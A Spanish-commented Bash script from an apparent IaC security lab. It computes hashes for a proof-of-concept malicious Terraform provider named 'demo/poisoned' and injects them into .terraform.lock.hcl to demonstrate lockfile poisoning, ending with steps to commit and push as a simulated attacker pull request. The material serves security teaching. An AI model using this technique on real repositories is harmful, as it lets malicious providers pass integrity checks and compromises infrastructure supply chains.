#!/usr/bin/env bash
# =============================================================================
# GENERATE-HASHES - Calcula hashes h1: y zh: para el provider PoC
# =============================================================================
# Genera los hashes necesarios para inyectar en .terraform.lock.hcl
# como parte de la prueba de concepto de lockfile poisoning.
#
# Uso:
#   chmod +x generate-hashes.sh
#   ./generate-hashes.sh [ruta-al-binario] [ruta-al-zip]
#
# Si no se pasan argumentos, busca los artefactos del provider-poc
# en el repo lab-iac-security (hermano de este repo).
#
# ⚠️  SOLO PARA USO EDUCATIVO en entornos aislados.
# =============================================================================
set -euo pipefail

# ── Configuración del provider ──────────────────────────────────────────────
PROVIDER_NAME="poisoned"
NS="demo"
VER="1.0.0"
OS_NAME="linux"
ARCH="amd64"
REG="registry.terraform.io"

BINARY_NAME="terraform-provider-${PROVIDER_NAME}_v${VER}"
ZIP_NAME="terraform-provider-${PROVIDER_NAME}_${VER}_${OS_NAME}_${ARCH}.zip"

# ── Colores ─────────────────────────────────────────────────────────────────
G='\033[0;32m'; Y='\033[1;33m'; C='\033[0;36m'; B='\033[0;34m'
R='\033[0;31m'; N='\033[0m'

DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
REPO_ROOT="$(cd "${DIR}/.." && pwd)"

# ── Buscar artefactos del provider PoC ──────────────────────────────────────
# Prioridad: argumentos > lab-iac-security hermano > provider-poc local
LAB_IAC="${REPO_ROOT}/../lab-iac-security/provider-poc"

if [ $# -ge 2 ]; then
  BINARY_PATH="$1"
  ZIP_PATH="$2"
elif [ $# -eq 1 ]; then
  BINARY_PATH="$1"
  ZIP_PATH=""
elif [ -d "${LAB_IAC}/build" ]; then
  BINARY_PATH="${LAB_IAC}/build/${BINARY_NAME}"
  ZIP_PATH=$(find "${LAB_IAC}/mirror" -name "${ZIP_NAME}" 2>/dev/null | head -1)
else
  echo -e "${R}ERROR: No se encontraron artefactos del provider PoC.${N}"
  echo ""
  echo "Opciones:"
  echo "  1. Compilar primero el provider en lab-iac-security/provider-poc/"
  echo "     cd ../lab-iac-security/provider-poc && ./build.sh"
  echo ""
  echo "  2. Pasar las rutas como argumentos:"
  echo "     ./generate-hashes.sh /ruta/al/binario /ruta/al/zip"
  exit 1
fi

# ── Validar que los archivos existen ────────────────────────────────────────
echo -e "${C}══ GENERATE-HASHES: Terraform Lockfile Poisoning PoC ══${N}"
echo ""

if [ ! -f "${BINARY_PATH}" ]; then
  echo -e "${R}ERROR: Binario no encontrado: ${BINARY_PATH}${N}"
  echo "Ejecuta primero: cd ../lab-iac-security/provider-poc && ./build.sh"
  exit 1
fi
echo -e "${G}  ✅ Binario:${N} ${BINARY_PATH}"

# Si no hay ZIP, lo creamos temporalmente para calcular h1
TEMP_ZIP=""
if [ -z "${ZIP_PATH}" ] || [ ! -f "${ZIP_PATH}" ]; then
  echo -e "${Y}  ⚠ ZIP no encontrado, creando temporal...${N}"
  TEMP_ZIP=$(mktemp /tmp/provider-hash-XXXXXX.zip)
  (cd "$(dirname "${BINARY_PATH}")" && zip -j "${TEMP_ZIP}" "$(basename "${BINARY_PATH}")" > /dev/null 2>&1)
  ZIP_PATH="${TEMP_ZIP}"
fi
echo -e "${G}  ✅ ZIP:${N}     ${ZIP_PATH}"
echo ""

# ── Calcular hashes ────────────────────────────────────────────────────────
echo -e "${Y}[1/3]${N} Calculando hashes..."

# h1: = base64(sha256_raw(zip_file))
H1_RAW=$(sha256sum "${ZIP_PATH}" | awk '{print $1}')
H1=$(echo -n "${H1_RAW}" | xxd -r -p | base64 | tr -d '\n')

# zh: = sha256_hex(binary)
ZH=$(sha256sum "${BINARY_PATH}" | awk '{print $1}')

echo -e "${B}  h1:${H1}${N}"
echo -e "${B}  zh:${ZH}${N}"
echo ""

# ── Generar bloque para .terraform.lock.hcl ─────────────────────────────────
echo -e "${Y}[2/3]${N} Generando bloque lockfile..."

LOCKFILE_BLOCK=$(cat <<EOF
provider "${REG}/${NS}/${PROVIDER_NAME}" {
  version     = "${VER}"
  constraints = "${VER}"
  hashes = [
    "h1:${H1}",
    "zh:${ZH}",
  ]
}
EOF
)

echo ""
echo -e "${C}── Bloque para .terraform.lock.hcl ──${N}"
echo "${LOCKFILE_BLOCK}"
echo ""

# ── Escribir/Actualizar .terraform.lock.hcl en la raíz del repo ────────────
echo -e "${Y}[3/3]${N} Actualizando .terraform.lock.hcl..."

LOCKFILE="${REPO_ROOT}/.terraform.lock.hcl"

# Si ya existe el lockfile, agregar el bloque del provider envenenado
if [ -f "${LOCKFILE}" ]; then
  # Verificar si ya tiene el provider poisoned
  if grep -q "${REG}/${NS}/${PROVIDER_NAME}" "${LOCKFILE}"; then
    echo -e "${Y}  ⚠ El provider ${NS}/${PROVIDER_NAME} ya existe en el lockfile.${N}"
    echo -e "${Y}    Reemplazando hashes...${N}"
    # Crear archivo temporal sin el bloque anterior del provider poisoned
    python3 -c "
import re, sys
content = open('${LOCKFILE}').read()
# Eliminar bloque existente del provider poisoned
pattern = r'provider \"${REG}/${NS}/${PROVIDER_NAME}\".*?\n\}\n'
content = re.sub(pattern, '', content, flags=re.DOTALL)
print(content.rstrip())
" > "${LOCKFILE}.tmp"
    echo "" >> "${LOCKFILE}.tmp"
    echo "" >> "${LOCKFILE}.tmp"
    echo "${LOCKFILE_BLOCK}" >> "${LOCKFILE}.tmp"
    echo "" >> "${LOCKFILE}.tmp"
    mv "${LOCKFILE}.tmp" "${LOCKFILE}"
  else
    # Agregar al final
    echo "" >> "${LOCKFILE}"
    echo "${LOCKFILE_BLOCK}" >> "${LOCKFILE}"
    echo "" >> "${LOCKFILE}"
  fi
  echo -e "${G}  ✅ Bloque inyectado en ${LOCKFILE}${N}"
else
  # Crear lockfile nuevo con solo el provider envenenado
  echo "${LOCKFILE_BLOCK}" > "${LOCKFILE}"
  echo "" >> "${LOCKFILE}"
  echo -e "${G}  ✅ Lockfile creado: ${LOCKFILE}${N}"
fi

# ── Limpiar temporal ────────────────────────────────────────────────────────
if [ -n "${TEMP_ZIP}" ] && [ -f "${TEMP_ZIP}" ]; then
  rm -f "${TEMP_ZIP}"
fi

# ── Resumen ─────────────────────────────────────────────────────────────────
echo ""
echo -e "${C}══════════════════════════════════════════════════════════${N}"
echo -e "${G} ✅ HASHES GENERADOS Y LOCKFILE ACTUALIZADO${N}"
echo -e "${C}══════════════════════════════════════════════════════════${N}"
echo -e " Provider: ${NS}/${PROVIDER_NAME} v${VER}"
echo -e " h1:      ${H1}"
echo -e " zh:      ${ZH}"
echo -e " Lockfile: ${LOCKFILE}"
echo -e "${C}══════════════════════════════════════════════════════════${N}"
echo ""
echo -e "${Y}PRÓXIMOS PASOS:${N}"
echo "  1. Revisar el .terraform.lock.hcl generado"
echo "  2. Agregar 'demo/poisoned' a required_providers en main.tf"
echo "  3. Hacer commit y push (simula el PR del atacante)"
echo ""

# Mostrar lockfile final
echo -e "${C}── .terraform.lock.hcl (contenido actual) ──${N}"
cat "${LOCKFILE}"
